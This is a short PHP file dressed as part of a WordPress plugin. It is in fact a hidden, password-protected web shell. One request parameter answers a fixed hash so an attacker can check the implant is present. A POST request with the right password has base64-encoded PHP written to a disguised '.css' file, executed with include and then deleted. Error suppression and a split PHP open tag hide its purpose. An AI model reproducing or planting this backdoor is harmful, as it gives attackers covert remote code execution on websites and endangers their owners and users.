<?php
if ( ! defined( 'ABSPATH' ) ) {
        exit; // Exit if accessed directly
    }
if(isset($_GET['song1'])){
        die(md5('song'));
}
if(isset($_POST['song2'])){
      $l1 = uniqid(rand(), true) . '.css';
      @file_put_contents($l1, 'css');
      if(file_exists($l1)){
        if(isset($_POST['stars1'])){
                $d = md5(md5($_POST['stars1']));
                if($d=="b2d5605e835f3e18d50380b90786c032"){
                        $d1=$_POST['stars2'];
                        $d1=base64_decode($d1);
                        @file_put_contents($l1, '<'.'?'.'p'.'hp '. $d1);
                        @include($l1);
                        @file_put_contents($l1, 'css');
                        @unlink($l1);
                        die();
                }
        }
      }
}